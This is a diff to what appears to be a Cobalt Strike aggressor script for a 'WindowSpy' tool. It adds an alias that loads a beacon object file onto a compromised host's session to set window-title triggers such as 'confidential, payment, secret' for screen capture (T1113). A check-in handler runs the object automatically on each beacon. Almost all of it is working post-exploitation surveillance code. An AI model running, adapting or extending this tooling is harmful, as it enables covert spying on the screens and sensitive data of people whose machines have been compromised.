@@ -1,5 +1,4 @@
 
-@alert = @("google");
 set BEACON_OUTPUT{
 
 	if(strlen($2) >= 29){
@@ -24,7 +23,7 @@ set BEACON_CHECKIN{
 }
 
 sub spy{
-	bscreenshot($1);
+	
 	#spy stuff goes here
 }
 
@@ -54,6 +53,30 @@ sub spy{
 #     beacon_inline_execute($bid, $data, "go", $args);
 # }
 
+alias windowspy_update {
+    local('$bid $barch $handle $data $args $target_pid');
+    $bid = $1;
+    # figure out the arch of this session
+    $barch  = barch($bid);
+    if (size(@_) != 2)
+    {
+        berror($1, "Syntax: windowspy_update confidential,payment,secret");
+                return;
+    }
+    # read in the right BOF file
+    $handle = openf(script_resource("WindowSpy. $+ $barch $+ .obj"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+
+    $args   = bof_pack($bid, "z", $2);
+
+    # announce what we're doing
+    btask($bid, "Updating WindowSpy triggers", "T1113");
+    # execute it.
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
 on beacon_checkin {
     local('$bid $barch $handle $data $args $target_pid');
     $bid = $1;
@@ -70,4 +93,3 @@ on beacon_checkin {
     # execute it.
     beacon_inline_execute($bid, $data, "go", $args);
 }
-
